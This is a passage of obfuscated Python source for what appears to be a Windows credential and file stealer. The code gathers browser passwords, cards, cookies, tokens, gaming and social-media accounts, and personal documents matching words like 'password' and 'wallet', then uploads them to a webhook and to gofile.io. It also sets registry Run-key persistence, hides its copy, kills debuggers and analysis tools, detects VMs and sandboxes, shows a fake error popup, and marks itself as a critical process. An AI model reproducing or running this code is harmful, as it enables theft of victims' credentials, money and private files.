        OO0O00O00OO0O000O =[{"name":"Password","value":"``"+str (len (Variables .Passwords ))+"``","inline":True },{"name":"Card","value":"``"+str (len (Variables .Cards ))+"``","inline":True },{"name":"Cookie","value":"``"+str (len (Variables .Cookies )+len (OOO0OO0O000O000OO .FirefoxCookieList ))+"``","inline":True },{"name":"History","value":"``"+str (len (Variables .Historys )+len (OOO0OO0O000O000OO .FirefoxHistoryList ))+"``","inline":True },{"name":"Download","value":"``"+str (len (Variables .Downloads ))+"``","inline":True },{"name":"Bookmark","value":"``"+str (len (Variables .Bookmarks ))+"``","inline":True },{"name":"Autofill","value":"``"+str (len (Variables .Autofills )+len (OOO0OO0O000O000OO .FirefoxAutofiList ))+"``","inline":True },{"name":"Tokens","value":"``"+str (len (Variables .FullTokens ))+"``","inline":True },{"name":"Instagram","value":"``"+str (len (Variables .InstagramAccounts ))+"``","inline":True },{"name":"Twitter","value":"``"+str (len (Variables .TwitterAccounts ))+"``","inline":True },{"name":"TikTok","value":"``"+str (len (Variables .TikTokAccounts ))+"``","inline":True },{"name":"Twitch","value":"``"+str (len (Variables .TwtichAccounts ))+"``","inline":True },{"name":"Reddit","value":"``"+str (len (Variables .RedditAccounts ))+"``","inline":True },{"name":"Spotify","value":"``"+str (len (Variables .SpotifyAccounts ))+"``","inline":True },{"name":"Riot Game's","value":"``"+str (len (Variables .RiotGameAccounts ))+"``","inline":True },{"name":"Roblox","value":"``"+str (len (Variables .RobloxAccounts ))+"``","inline":True },{"name":"Steam","value":"``"+str (len (Variables .SteamAccounts ))+"``","inline":True },{"name":"Wifi","value":"``"+str (len (Variables .Wifis ))+"``","inline":True },{"name":"FireFox?","value":"``"+str (OOO0OO0O000O000OO .FireFox )+"``","inline":True },]#line:1827
        OO0OO0OO00OOOOO0O ["fields"]=OO0O00O00OO0O000O
        async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as O0O0OOOOO000O0O0O :
            OOO00OO0O0OO0OOOO ={"username":"Shit","embeds":[OO0OO0OO00OOOOO0O ]}
            OOOOOOOOOOOOOO0O0 ={"Content-Type":"application/json"}
            async with O0O0OOOOO000O0O0O .post (webhook ,json =OOO00OO0O0OO0OOOO ,headers =OOOOOOOOOOOOOO0O0 )as OO00OO00O000OOOOO :
                pass
            await OOO0OO0O000O000OO .SendContains ()
            if not os .path .getsize (OOOOOO00O0OO00O00 +".zip")/(1024 *1024 )>15 :
                with open (OOOOOO00O0OO00O00 +".zip",'rb')as OOOO0OOOO00O0OOOO :
                    OO000O000OO00O0O0 =OOOO0OOOO00O0OOOO .read ()
                OOO00OO0O0OO0OOOO =aiohttp .FormData ()
                OOO00OO0O0OO0OOOO .add_field ('file',OO000O000OO00O0O0 ,filename =os .path .basename (OOOOOO00O0OO00O00 +".zip"))
                async with O0O0OOOOO000O0O0O .post (webhook ,data =OOO00OO0O0OO0OOOO )as O0O0O0O0O00OO0000 :
                    pass
                del OOO00OO0O0OO0OOOO
            else :
                OO00OOO0OO00000OO =await UploadGoFile .upload_file (OOOOOO00O0OO00O00 +".zip")
                if OO00OOO0OO00000OO !=None :
                    O0OO0OO0O0000000O ={"title":"***Shit***","description":f"***Full Info***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
                    OO000000OOOOOO0O0 =[{"name":"Download Link","value":f"[{O0O0OOOOO000OO00O}.zip]({OO00OOO0OO00000OO})","inline":True }]
                    O0OO0OO0O0000000O ["fields"]=OO000000OOOOOO0O0
                    OO0O0O0OOOOO0OOOO ={"username":"Shit","embeds":[O0OO0OO0O0000000O ]}
                    async with O0O0OOOOO000O0O0O .post (webhook ,json =OO0O0O0OOOOO0OOOO )as OO0O00O0OOO0O0O00 :
                        pass
                else :pass
            try :
                os .remove (OOOOOO00O0OO00O00 +".zip")
                shutil .rmtree (OOOOOO00O0OO00O00 )
            except :
                pass
class UploadGoFile :
    @staticmethod
    async def GetServer ()->str :
        try :
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O0O00OOO0 :
                async with OO000O00O0O00OOO0 .get ("https://api.gofile.io/getServer")as O0O0000OO0000O000 :
                    O0O00000000000OOO =await O0O0000OO0000O000 .json ()
                    return O0O00000000000OOO ["data"]["server"]
        except Exception :
            return "store1"
    @staticmethod
    async def upload_file (OOOOO00000OOO0O00 :str )->str :
        try :
            OOO0000OOOOOO0OOO =await UploadGoFile .GetServer ()
            O0O0OOO0OO0O0O0O0 =f"https://{OOO0000OOOOOO0OOO}.gofile.io/uploadFile"
            async with aiohttp .ClientSession ()as O0O0OOO0OO0OO00OO :
                O0OOOOO0OO0O000O0 =aiohttp .FormData ()
                O0OOOOO0OO0O000O0 .add_field ('file',open (OOOOO00000OOO0O00 ,'rb'),filename =os .path .basename (OOOOO00000OOO0O00 ))
                async with O0O0OOO0OO0OO00OO .post (O0O0OOO0OO0O0O0O0 ,data =O0OOOOO0OO0O000O0 )as OOO0OOOO0OOO000O0 :
                    OOO00OO000OO00OOO =await OOO0OOOO0OOO000O0 .text ()
                    O0O00O0OOOOOO0O00 =json .loads (OOO00OO000OO00OOO )
                    O00O0000O00O0OOOO =json .dumps (O0O00O0OOOOOO0O00 )
                    O00OO0OO00O000O00 =json .loads (O00O0000O00O0OOOO )
                    OO00O000OOOO0O0OO =O00OO0OO00O000O00 ['data']['downloadPage']
                    return OO00O000OOOO0O0OO
        except Exception :
            return None
class StealCommonFiles :
    def __init__ (OO00OO0O0OO0OOOO0 )->None :
        OO00OO0O0OO0OOOO0 .temp =os .getenv ("temp")
    async def StealFiles (OO0000O00000O0OO0 )->None :
        try :
            OO0O00O0O00OOOO00 =(("Desktop",os .path .join (os .getenv ("userprofile"),"Desktop")),("Desktop2",os .path .join (os .getenv ("userprofile"),"OneDrive","Desktop")),("Pictures",os .path .join (os .getenv ("userprofile"),"Pictures")),("Documents",os .path .join (os .getenv ("userprofile"),"Documents")),("Music",os .path .join (os .getenv ("userprofile"),"Music")),("Videos",os .path .join (os .getenv ("userprofile"),"Videos")),("Downloads",os .path .join (os .getenv ("userprofile"),"Downloads")),)
            O0OOO00OOOOO0O000 =os .path .join (OO0000O00000O0OO0 .temp ,"Shittingfiles")
            if not os .path .exists (O0OOO00OOOOO0O000 ):
                os .makedirs (O0OOO00OOOOO0O000 )
            O0OOO0O0OO0000000 =["secret","password","account","tax","key","wallet","backup"]
            OO0OOO0O0O0O000OO =[".txt",".doc",".docx",".png",".pdf",".jpg",".jpeg",".csv",".mp3",".mp4",".xls",".xlsx",".zip"]
            for _OOO00O000OOOOOOOO ,O0O00O0OO0000O000 in OO0O00O0O00OOOO00 :
                if os .path .isdir (O0O00O0OO0000O000 ):
                    for O0OOOOO0OO000OOO0 ,_OOO00O000OOOOOOOO ,OO0OOO0000OOOO0O0 in os .walk (O0O00O0OO0000O000 ):
                        for OOOO000OO0O0OOOO0 in OO0OOO0000OOOO0O0 :
                            OOO0OO0OOOO00O0OO =os .path .join (O0OOOOO0OO000OOO0 ,OOOO000OO0O0OOOO0 )
                            _OOO00O000OOOOOOOO ,OO000OO000OOO00OO =os .path .splitext (OOOO000OO0O0OOOO0 )
                            if (OO000OO000OOO00OO .lower ()in OO0OOO0O0O0O000OO and os .path .getsize (OOO0OO0OOOO00O0OO )<2 *1024 *1024 or any (O0000OOOO0OOO0000 in OOOO000OO0O0OOOO0 .lower ()for O0000OOOO0OOO0000 in O0OOO0O0OO0000000 )):
                                O0O000OO000OO0OO0 =os .path .basename (os .path .normpath (O0OOOOO0OO000OOO0 ))
                                OO00OO0OOOO00000O =os .path .join (O0OOO00OOOOO0O000 ,O0O000OO000OO0OO0 )
                                if not os .path .exists (OO00OO0OOOO00000O ):
                                    os .makedirs (OO00OO0OOOO00000O )
                                O0OOOOOOO0O0OO0OO =os .path .join (OO00OO0OOOO00000O ,OOOO000OO0O0OOOO0 )
                                shutil .copy2 (OOO0OO0OOOO00O0OO ,O0OOOOOOO0O0OO0OO )
            shutil .make_archive (O0OOO00OOOOO0O000 ,'zip',O0OOO00OOOOO0O000 )
            O000O0OO0O0O0O0OO =await UploadGoFile .upload_file (O0OOO00OOOOO0O000 +".zip")
            if not O000O0OO0O0O0O0OO ==None :
                async with aiohttp .ClientSession ()as OO00O00O0O000OOO0 :
                    O0OOO0O00OOO0O000 ={"title":"***Shit***","description":f"***Shit***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
                    O000000OO00OO00OO =[{"name":"Download Link","value":f"[Files.zip]({O000O0OO0O0O0O0OO})","inline":True }]
                    O0OOO0O00OOO0O000 ["fields"]=O000000OO00OO00OO
                    OO0OOOOOO00O0O000 ={"username":"Shit","embeds":[O0OOO0O00OOO0O000 ]}
                    async with OO00O00O0O000OOO0 .post (webhook ,json =OO0OOOOOO00O0O000 )as OOO000O0OOOOOOOO0 :
                        pass
            try :
                os .remove (O0OOO00OOOOO0O000 +".zip")
                shutil .rmtree (O0OOO00OOOOO0O000 )
            except :
                pass
        except :
            pass
class Startup :
    def __init__ (OO0O0OO0OO0OO00O0 )->None :
        OO0O0OO0OO0OO00O0 .LocalAppData =os .getenv ("LOCALAPPDATA")
        OO0O0OO0OO0OO00O0 .RoamingAppData =os .getenv ("APPDATA")
        OO0O0OO0OO0OO00O0 .CurrentFile =os .path .abspath (sys .argv [0 ])
        OO0O0OO0OO0OO00O0 .Privalage :bool =SubModules .IsAdmin ()
        OO0O0OO0OO0OO00O0 .ToPath :str =os .path .join (OO0O0OO0OO0OO00O0 .LocalAppData ,"Shit","shitting.exe")
    async def main (O00OO0000O0OO00OO )->None :
        await O00OO0000O0OO00OO .CreatePathAndMelt ()
        if startup_method =="regedit":
            await O00OO0000O0OO00OO .RegeditStartup ()
        else :pass
    async def CreatePathAndMelt (OO0O00OOO000OO00O )->None :
        try :
            if os .path .exists (OO0O00OOO000OO00O .ToPath ):
                return
            else :
                os .mkdir (OO0O00OOO000OO00O .ToPath .replace ("Shit.exe",""))
                shutil .copyfile (OO0O00OOO000OO00O .CurrentFile ,OO0O00OOO000OO00O .ToPath )
                O00O0000OO0OOOOOO =await asyncio .create_subprocess_shell (f'attrib +h +s "{OO0O00OOO000OO00O.ToPath}"',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
                await O00O0000OO0OOOOOO .communicate ()
        except Exception :
            pass
    async def RegeditStartup (O000O0OOO0OOO00OO )->None :
        try :
            if not O000O0OOO0OOO00OO .Privalage :
                OOO0OOO0OOO000O0O =await asyncio .create_subprocess_shell (f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{O000O0OOO0OOO00OO.ToPath}" /f',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
                await OOO0OOO0OOO000O0O .communicate ()
            else :
                OOO0OOO0OOO000O0O =await asyncio .create_subprocess_shell (f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{O000O0OOO0OOO00OO.ToPath}" /f',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
                await OOO0OOO0OOO000O0O .communicate ()
        except Exception :
            pass
class AntiDebug :
    def __init__ (OOOO0OO0OOOO0OO00 )->None :
        OOOO0OO0OOOO0OO00 .banned_uuids =["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","71DC2242-6EA2-C40B-0798-B4F5B4CC8776","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4"]
        OOOO0OO0OOOO0OO00 .banned_computer_names =["WDAGUtilityAccount","Harry Johnson","JOANNA","WINZDS-21T43RNG","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","COMPNAME_4491","WILEYPC","WORK","KATHLROGE","DESKTOP-TKGQ6GH","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","DESKTOP-NNSJYNR","JULIA-PC","DESKTOP-BQISITB","d1bnJkfVlH"]
        OOOO0OO0OOOO0OO00 .banned_process =["HTTP Toolkit.exe","httpdebuggerui.exe","wireshark.exe","fiddler.exe","regedit.exe","taskmgr.exe","vboxservice.exe","df5serv.exe","processhacker.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","ida64.exe","ollydbg.exe","pestudio.exe","vmwareuser.exe","vgauthservice.exe","vmacthlp.exe","x96dbg.exe","vmsrvc.exe","x32dbg.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","ksdumperclient.exe","ksdumper.exe","joeboxserver.exe"]
    async def FunctionRunner (O0O0O0O0000O00000 ):
        OOO0000000O000000 =[asyncio .create_task (O0O0O0O0000O00000 .check_system ()),asyncio .create_task (O0O0O0O0000O00000 .kill_process ())]
        await asyncio .gather (*OOO0000000O000000 )
    async def check_system (O0O0O00O00O00O0OO )->None :
        O0000O0OO00OOOO0O ="wmic csproduct get uuid"
        OOOOO00O0OO0OO000 =await asyncio .create_subprocess_shell (O0000O0OO00OOOO0O ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
        O00000O0O00O0O00O ,O0OOOO0OO0000000O =await OOOOO00O0OO0OO000 .communicate ()
        OO0OO000O0000000O =O00000O0O00O0O00O .decode (errors ="ignore").split ("\n")
        OOO0OO0O0OOOOOO0O =OO0OO000O0000000O [1 ].strip ()
        O0000O00OOOO0O000 =os .getenv ("computername")
        for O00OO0OOO0OOO0O00 in O0O0O00O00O00O0OO .banned_uuids :
            if O00OO0OOO0OOO0O00 in OOO0OO0O0OOOOOO0O :
                os ._exit (0 )
        for O00O0OO000O0000O0 in O0O0O00O00O00O0OO .banned_computer_names :
            if O00O0OO000O0000O0 in O0000O00OOOO0O000 :
                os ._exit (0 )
    async def kill_process (O0O00O000O0000OO0 )->None :
        try :
            O0O00OO0OO00OOO00 =await asyncio .create_subprocess_shell ('tasklist',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO0OOOOO000O00OO0 ,_OOO00OOO00000O0O0 =await O0O00OO0OO00OOO00 .communicate ()
            OO0OOOOO000O00OO0 =OO0OOOOO000O00OO0 .decode (errors ="ignore")
            for O0OOOOO00O0O0OO0O in O0O00O000O0000OO0 .banned_process :
                if O0OOOOO00O0O0OO0O .lower ()in OO0OOOOO000O00OO0 .lower ():
                    O0O00OO0OO00OOO00 =await asyncio .create_subprocess_shell (f'taskkill /F /IM "{O0OOOOO00O0O0OO0O}"',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
                    await O0O00OO0OO00OOO00 .communicate ()
        except :
            pass
class AntiVM :
    async def FunctionRunner (O00OOO000OO0000OO )->None :
        OOO00OOO00000O00O =[asyncio .create_task (O00OOO000OO0000OO .CheckGpu ()),asyncio .create_task (O00OOO000OO0000OO .CheckHypervisor ()),asyncio .create_task (O00OOO000OO0000OO .CheckHostName ()),asyncio .create_task (O00OOO000OO0000OO .CheckDisk ()),asyncio .create_task (O00OOO000OO0000OO .CheckDLL ()),asyncio .create_task (O00OOO000OO0000OO .CheckGDB ()),asyncio .create_task (O00OOO000OO0000OO .CheckProcess ()),]
        O0OO0OOO0O0OO0OOO =await asyncio .gather (*OOO00OOO00000O00O )
        if any (O0OO0OOO0O0OO0OOO ):
            try :
                os .exit (0 )
            except :
                try :
                    os .exit (0 )
                except :
                    try :
                        ctypes .windll .kernel32 .ExitProcess (0 )
                    except :
                        try :
                            exit (0 )
                        except :
                            pass
    async def CheckGpu (OOO0O0OOO0O000O00 )->bool :
        try :
            OO00OOOO00OOOOOO0 =await asyncio .create_subprocess_shell ('wmic path win32_VideoController get name',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO000O00OO0000OO0 ,OO00OO0OO0O0O0000 =await OO00OOOO00OOOOOO0 .communicate ()
            O0O000000OOO00O0O =OO000O00OO0000OO0 .decode (errors ='ignore').splitlines ()
            return any (OOOO00000OO000O00 .lower ()in O0O000000OOO00O0O [2 ].strip ().lower ()for OOOO00000OO000O00 in ("virtualbox","vmware"))
        except :
            return False
    async def CheckHostName (O0OOO0O0OO0OOOO00 )->bool :
        try :
            O0O0000OO0O0OOO00 =['sandbox','cuckoo','vm','virtual','qemu','vbox','xen']
            OOOOOOO0OOOOOOO00 =platform .node ().lower ()
            for O00O00OOOO0O00000 in O0O0000OO0O0OOO00 :
                if O00O00OOOO0O00000 in OOOOOOO0OOOOOOO00 :
                    return True
            return False
        except :
            return False
    async def CheckDisk (O00OO00O0O0O000O0 )->bool :
        try :
            return any ([os .path .isdir (OO00O00OOO00OOOOO )for OO00O00OOO00OOOOO in ('D:\\Tools','D:\\OS2','D:\\NT3X')])
        except :
            return False
    async def CheckDLL (O0OOOO00O0O00O0O0 )->bool :
        try :
            OOO0O00OO0OO000O0 =ctypes .windll .LoadLibrary ("SbieDll.dll")
        except :
            return False
        else :
            return True
    async def CheckGDB (OOOOOOOO0OOO0O0O0 )->bool :
        try :
            O0000O0O0OOO0OOO0 =await asyncio .create_subprocess_shell ("gdb --version",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            O000O0000O0OOOOO0 ,O00O0O000000OO0O0 =await O0000O0O0OOO0OOO0 .communicate ()
            if b"GDB"in O000O0000O0OOOOO0 :
                return True
        except :
            return False
    async def CheckProcess (O00O0O000OO0O0OOO )->bool :
        try :
            O0OOOO0OOO00O00OO =["vmtoolsd.exe","vmwaretray.exe","vmacthlp.exe","vboxtray.exe","vboxservice.exe","vmsrvc.exe","prl_tools.exe","xenservice.exe",]
            OO0O0OO00000OO00O =await asyncio .create_subprocess_shell ("tasklist",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO0O000OO0OO00O0O ,O00OOOO0O0O0O00O0 =await OO0O0OO00000OO00O .communicate ()
            O0000OO0OOOOOOO00 =OO0O000OO0OO00O0O .decode ().lower ()
            for OO0O0OO00000OO00O in O0OOOO0OOO00O00OO :
                if OO0O0OO00000OO00O in O0000OO0OOOOOOO00 :
                    return True
            return False
        except :
            return False
    async def CheckHypervisor (O000000O0O00O0OO0 )->bool :
        try :
            OO0OOOO000O0O0OO0 =await asyncio .create_subprocess_shell ('wmic computersystem get Manufacturer',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            O0OOO000O0O0O00OO ,O000OO0OOO0OO000O =await OO0OOOO000O0O0OO0 .communicate ()
            OO000O00O00OO000O =await asyncio .create_subprocess_shell ('wmic path Win32_ComputerSystem get Manufacturer',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            O0O000O0OOOOO0OO0 ,OOO0O0000O000000O =await OO000O00O00OO000O .communicate ()
            if b'VMware'in O0OOO000O0O0O00OO :
                return True
            elif b"vmware"in O0O000O0OOOOO0OO0 .lower ():
                return True
        except :
            return False
async def Fakerror ()->None :
    try :
        if FakeError [0 ]and not os .path .abspath (sys .argv [0 ])==os .path .join (os .getenv ("LOCALAPPDATA"),"ShittingUpdateService","Shitting.exe"):
            O000O0O0000OO0OOO =FakeError [1 ][0 ].replace ("\x22","\\x22").replace ("\x27","\\x22")
            OO00OOOO0O0OOO0OO =FakeError [1 ][1 ].replace ("\x22","\\x22").replace ("\x27","\\x22")
            O0OOOO0OO00OOO000 ='''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format (OO00OOOO0O0OOO0OO ,O000O0O0000OO0OOO ,FakeError [1 ][2 ])
            await asyncio .create_subprocess_shell (O0OOOO0OO00OOO000 ,shell =True )
    except :pass
def is_runas ():
    try :
        return ctypes .windll .shell32 .IsUserAnAdmin ()
    except Exception :
           return False
def shitishere ():
  try :
    return os .path .exists (sys .executable )
  except Exception :
           pass
SE_DEBUG_NAME ="SeDebugPrivilege"
SE_PRIVILEGE_ENABLED =0x00000002
class LUID (ctypes .Structure ):
    _fields_ =[("LowPart",ctypes .c_uint32 ),("HighPart",ctypes .c_int32 )]
class LUIDAndAttributes (ctypes .Structure ):
    _fields_ =[("Luid",LUID ),("Attributes",ctypes .c_uint32 )]
class TokenPrivileges (ctypes .Structure ):
    _fields_ =[("PrivilegeCount",ctypes .c_uint32 ),("Privileges",LUIDAndAttributes *1 )]
advapi32 =ctypes .windll .advapi32
ntdll =ctypes .windll .ntdll
kernel32 =ctypes .windll .kernel32
def LookupPrivilegeValue (OO0OOOOOO0OO0O0O0 ,O0000000O0O0OO0O0 ,O00OO0O00OO0O000O ):
    O000O0OO0OOO00000 =advapi32 .LookupPrivilegeValueW (OO0OOOOOO0OO0O0O0 ,O0000000O0O0OO0O0 ,ctypes .byref (O00OO0O00OO0O000O ))
    if O000O0OO0OOO00000 ==0 :
        raise ctypes .WinError (ctypes .get_last_error ())
    return O000O0OO0OOO00000
def AdjustTokenPrivileges (O0O0OO0O00000O0OO ,OO0O00O0OOOO0O00O ,O0OO0OOOOO00OO0O0 ,O0OOOOO0OO0OO000O ,O0O00O000OOO0OO0O ,OOOO0OO0OO00O0OO0 ):
    OOOOO0OOOO0OOO000 =advapi32 .AdjustTokenPrivileges (O0O0OO0O00000O0OO ,OO0O00O0OOOO0O00O ,ctypes .byref (O0OO0OOOOO00OO0O0 ),O0OOOOO0OO0OO000O ,ctypes .byref (O0O00O000OOO0OO0O ),OOOO0OO0OO00O0OO0 )
    if OOOOO0OOOO0OOO000 ==0 :
        raise ctypes .WinError (ctypes .get_last_error ())
    return OOOOO0OOOO0OOO000
def SetDebugPrivilege ():
    O0OO0000OO00O0OOO =kernel32 .GetCurrentProcess ()
    OO000OOOOOO0O0OOO =ctypes .c_void_p ()
    if not kernel32 .OpenProcessToken (O0OO0000OO00O0OOO ,0x0020 |0x0008 ,ctypes .byref (OO000OOOOOO0O0OOO )):
        raise ctypes .WinError (ctypes .get_last_error ())
    OOOO0O00O00OOO00O =LUID ()
    LookupPrivilegeValue (None ,SE_DEBUG_NAME ,OOOO0O00O00OOO00O )
    OO0O0OOOO00O0000O =TokenPrivileges ()
    OO0O0OOOO00O0000O .PrivilegeCount =1
    OO0O0OOOO00O0000O .Privileges [0 ]=LUIDAndAttributes (OOOO0O00O00OOO00O ,SE_PRIVILEGE_ENABLED )
    AdjustTokenPrivileges (OO000OOOOOO0O0OOO ,False ,OO0O0OOOO00O0000O ,ctypes .sizeof (OO0O0OOOO00O0000O ),None ,None )
    return OO000OOOOOO0O0OOO
def SetProcessCritical ():
    SetDebugPrivilege ()
    OOO000000O0OOOOOO =ntdll .RtlSetProcessIsCritical (1 ,0 ,0 )
    if OOO000000O0OOOOOO !=0 :
        return True
    else :
        raise ctypes .WinError (ctypes .get_last_error ())
ntdll =ctypes .windll .ntdll
kernel32 =ctypes .windll .kernel32
PROCESS_QUERY_INFORMATION =0x0400
MAX_PATH =260
class ProcessInfo (ctypes .Structure ):
    _fields_ =[("Res1",ctypes .c_uint64 ),("PebAddr",ctypes .c_uint64 ),("Res2",ctypes .c_uint64 *2 ),("PID",ctypes .c_uint64 ),("InheritedFromPID",ctypes .c_uint64 )]
def NtQueryProc (O0O0O0OOO0O0OOOOO ,OOO00O0O00OOOOO00 ,O00OOOO0O00O000O0 ,O0OOOOO0O00OO000O ):
    O00O000OOOO000OO0 =ntdll .NtQueryInformationProcess (O0O0O0OOO0O0OOOOO ,OOO00O0O00OOOOO00 ,ctypes .byref (O00OOOO0O00O000O0 ),O0OOOOO0O00OO000O ,0 )
    if O00O000OOOO000OO0 !=0 :
        return False
    return True
def QueryImageName (O0OOO0OOO0OOOO000 ,OO00OO0OOO000OOO0 ,O00000O0O0O0O0OO0 ,O000000OO000OO00O ):
    O000000OO000OO00O .value =MAX_PATH
    O0O000OOOOOOO00O0 =kernel32 .QueryFullProcessImageNameW (O0OOO0OOO0OOOO000 ,OO00OO0OOO000OOO0 ,O00000O0O0O0O0OO0 ,ctypes .byref (O000000OO000OO00O ))
    if O0O000OOOOOOO00O0 ==0 :
        return False
    return True
def CurrentProcName ():
    try :
        OOOO00OO0O0O0OOO0 =sys .executable
        return os .path .basename (OOOO00OO0O0O0OOO0 )
    except Exception :
        return None
def ParentAntiDebug ():
    OOOO0OOO00000000O =0
    O000OO00O0OO00O00 =ProcessInfo ()
    if not NtQueryProc (kernel32 .GetCurrentProcess (),OOOO0OOO00000000O ,O000OO00O0OO00O00 ,ctypes .sizeof (O000OO00O0OO00O00 )):
        return False
    OOO0OOO00OOOOOOO0 =ctypes .c_int32 (O000OO00O0OO00O00 .InheritedFromPID ).value
    if OOO0OOO00OOOOOOO0 ==0 :
        return False
    try :
        O00O0O0OOO0O0000O =psutil .Process (OOO0OOO00OOOOOOO0 )
    except psutil .NoSuchProcess :
        return False
    try :
        O0O00O000OO0OO00O =O00O0O0OOO0O0000O .name ()
    except psutil .NoSuchProcess :
        return False
    if O0O00O000OO0OO00O .lower ()not in ["explorer.exe","cmd.exe"]:
        return True
    else :
        return False
if __name__ =='__main__':
    try :
        security =guardshield .Security ()
        if is_runas ()or SetProcessCritical ()or not ParentAntiDebug ()or not security .check_vm ()or not shitishere ()or security .check_debug ()or security .check_sandbox ():
            if os .name =="nt":
                if not SubModules .create_mutex ("9786 | 5678 | 1234 |"):
                    os ._exit (0 )
                else :
                    start_time =time .time ()
                    asyncio .run (AntiVM ().FunctionRunner ())
                    asyncio .run (AntiDebug ().FunctionRunner ())
                    asyncio .run (Startup ().main ())
                    asyncio .run (Fakerror ())
                    main_instance =Main ()
                    asyncio .run (main_instance .FunctionRunner ())
                    asyncio .run (StealCommonFiles ().StealFiles ())
            else :
                os .exit (0 )
        else :
            os .exit (0 )
    except KeyboardInterrupt :
        os ._exit (0 )
    except Exception :
        pass 